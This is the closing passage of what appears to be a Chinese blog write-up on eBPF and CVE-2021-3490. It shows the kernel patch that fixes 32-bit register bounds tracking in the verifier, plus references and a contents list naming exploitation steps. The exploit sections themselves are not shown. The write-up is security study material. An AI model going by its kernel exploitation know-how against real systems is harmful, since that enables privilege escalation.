</span><span style="color:#c0c5ce;"> 
</span><span style="color:#bf616a;">-	/* Assuming scalar64_min_max_and will be called so its safe
</span><span style="color:#bf616a;">-	 * to skip updating register for known 32-bit case.
</span><span style="color:#bf616a;">-	 */
</span><span style="color:#bf616a;">-	if (src_known &amp;&amp; dst_known)
</span><span style="color:#a3be8c;">+	if (src_known &amp;&amp; dst_known) {
</span><span style="color:#a3be8c;">+		__mark_reg32_known(dst_reg, var32_off.value);
</span><span style="color:#c0c5ce;"> 		return;
</span><span style="color:#a3be8c;">+	}
</span><span style="color:#c0c5ce;"> 
</span><span style="color:#c0c5ce;"> 	/* We get our minimum from the var_off, since that&#39;s inherently
</span><span style="color:#c0c5ce;"> 	 * bitwise.  Our maximum is the minimum of the operands&#39; maxima.
</span><span style="color:#c0c5ce;">@@ -7108,7 +7107,6 @@ static void scalar32_min_max_and(struct bpf_reg_state *dst_reg,
</span><span style="color:#c0c5ce;"> 		dst_reg-&gt;s32_min_value = dst_reg-&gt;u32_min_value;
</span><span style="color:#c0c5ce;"> 		dst_reg-&gt;s32_max_value = dst_reg-&gt;u32_max_value;
</span><span style="color:#c0c5ce;"> 	}
</span><span style="color:#bf616a;">-
</span><span style="color:#c0c5ce;"> }
</span><span style="color:#c0c5ce;"> 
</span><span style="color:#c0c5ce;"> static void scalar_min_max_and(struct bpf_reg_state *dst_reg,
</span><span style="color:#c0c5ce;">@@ -7155,11 +7153,10 @@ static void scalar32_min_max_or(struct bpf_reg_state *dst_reg,
</span><span style="color:#c0c5ce;"> 	s32 smin_val = src_reg-&gt;s32_min_value;
</span><span style="color:#c0c5ce;"> 	u32 umin_val = src_reg-&gt;u32_min_value;
</span><span style="color:#c0c5ce;"> 
</span><span style="color:#bf616a;">-	/* Assuming scalar64_min_max_or will be called so it is safe
</span><span style="color:#bf616a;">-	 * to skip updating register for known case.
</span><span style="color:#bf616a;">-	 */
</span><span style="color:#bf616a;">-	if (src_known &amp;&amp; dst_known)
</span><span style="color:#a3be8c;">+	if (src_known &amp;&amp; dst_known) {
</span><span style="color:#a3be8c;">+		__mark_reg32_known(dst_reg, var32_off.value);
</span><span style="color:#c0c5ce;"> 		return;
</span><span style="color:#a3be8c;">+	}
</span><span style="color:#c0c5ce;"> 
</span><span style="color:#c0c5ce;"> 	/* We get our maximum from the var_off, and our minimum is the
</span><span style="color:#c0c5ce;"> 	 * maximum of the operands&#39; minima
</span><span style="color:#c0c5ce;">@@ -7224,11 +7221,10 @@ static void scalar32_min_max_xor(struct bpf_reg_state *dst_reg,
</span><span style="color:#c0c5ce;"> 	struct tnum var32_off = tnum_subreg(dst_reg-&gt;var_off);
</span><span style="color:#c0c5ce;"> 	s32 smin_val = src_reg-&gt;s32_min_value;
</span><span style="color:#c0c5ce;"> 
</span><span style="color:#bf616a;">-	/* Assuming scalar64_min_max_xor will be called so it is safe
</span><span style="color:#bf616a;">-	 * to skip updating register for known case.
</span><span style="color:#bf616a;">-	 */
</span><span style="color:#bf616a;">-	if (src_known &amp;&amp; dst_known)
</span><span style="color:#a3be8c;">+	if (src_known &amp;&amp; dst_known) {
</span><span style="color:#a3be8c;">+		__mark_reg32_known(dst_reg, var32_off.value);
</span><span style="color:#c0c5ce;"> 		return;
</span><span style="color:#a3be8c;">+	}
</span><span style="color:#c0c5ce;"> 
</span><span style="color:#c0c5ce;"> 	/* We get both minimum and maximum from the var32_off. */
</span><span style="color:#c0c5ce;"> 	dst_reg-&gt;u32_min_value = var32_off.value;
</span></pre>
<h2 id="misc">misc</h2><p><code>bpf</code>系统调用参数<code>bpf_attr</code>结构体中可以设置log_level，log内容在传入的log_buf参数</p>
<h2 id="reference">reference</h2><ul>
<li><a href="https://arttnba3.cn/2023/05/31/EBPF_0X00/">【EBPF.0x00】eBPF 入门指北（一）：简介</a></li>
<li><a href="https://arttnba3.cn/2023/06/04/CVE-0X0A-CVE-2021-3490/">【CVE.0x0A】CVE-2021-3490 漏洞复现及简要分析</a></li>
</ul>
</main>
                <aside class="toc-sidebar">
                    <div class="toc-sticky-container">
                        <div class="toc-header">:: Contents ::</div>
                        <ul class="toc-list"><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#shen-me-shi-ebpf">什么是eBPF</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#shi-yong-shi-li">使用示例</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#ebpf-xu-ni-ji">eBPF 虚拟机</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#bpf-reg-state">bpf_reg_state</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#ji-cun-qi-lei-xing">寄存器类型</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#ebpfzhi-ling-yu-ebpfcheng-xu">eBPF指令与eBPF程序</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#ebpf-map">eBPF map</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#bpfxi-tong-diao-yong">bpf系统调用</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#bpf-attrjie-gou-ti">bpf_attr结构体</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#sys-bpf-xi-tong-diao-yong-he-xin-han-shu">__sys_bpf() 系统调用核心函数</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#raw-ebpf-cheng-xu-bian-xie-ru-men">raw eBPF 程序编写入门</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#ebpfzhi-ling-ge-shi">eBPF指令格式</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#raw-ebpf-cheng-xu-bian-xie">raw eBPF 程序编写</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#raw-ebpf-mapshi-yong">raw eBPF map使用</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#ebpffu-zhu-han-shu">ebpf辅助函数</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#ding-yi">定义</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#diao-yong-liu-cheng">调用流程</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#loadhou-ebpfdiao-yong-lu-jing">load后ebpf调用路径</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#cve-2021-3490">cve-2021-3490</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#lou-dong-fen-xi">漏洞分析</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#lou-dong-li-yong">漏洞利用</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#gou-zao-bian-jie-zhi-1-0-ji-cun-qi">构造边界值[1,0]寄存器</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#gou-zao-yun-xing-shi-wei-1-verifier-que-xin-wei-0-de-ji-cun-qi">构造运行时为 1、verifier 确信为 0 的寄存器</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#nei-he-di-zhi-xie-lou">内核地址泄漏</a></li><li class="toc-item toc-h4" data-level="4" style="margin-left:12px"><a href="#alu-sanitation-bypass">ALU Sanitation bypass</a></li><li class="toc-item toc-h4" data-level="4" style="margin-left:12px"><a href="#oob-read-on-bpf-array">OOB-read on bpf_array</a></li><li class="toc-item toc-h4" data-level="4" style="margin-left:12px"><a href="#leak-map-address">Leak map address</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#ren-yi-di-zhi-du-xie-lu-jin-cheng-di-zhi">任意地址读，泄露进程地址</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#ren-yi-di-zhi-xie">任意地址写</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#exp">exp</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#extra-new-alu-sanitation-bypass">Extra. New ALU Sanitation bypass</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#lou-dong-xiu-fu">漏洞修复</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#misc">misc</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#reference">reference</a></li></ul>
                    </div>
                </aside>
            </div> 
    <footer style="margin-top: 50px; border-top: 1px solid #333; padding-top: 20px; font-size: 0.8rem; color: #555; text-align: center;">
        Built with Rust. <span style="color: #66ed59;">EOF</span>
    </footer>
    <button id="back-to-top" aria-label="Back to Top">^TOP</button>
    <script src="/script.js"></script>
</body>
</html>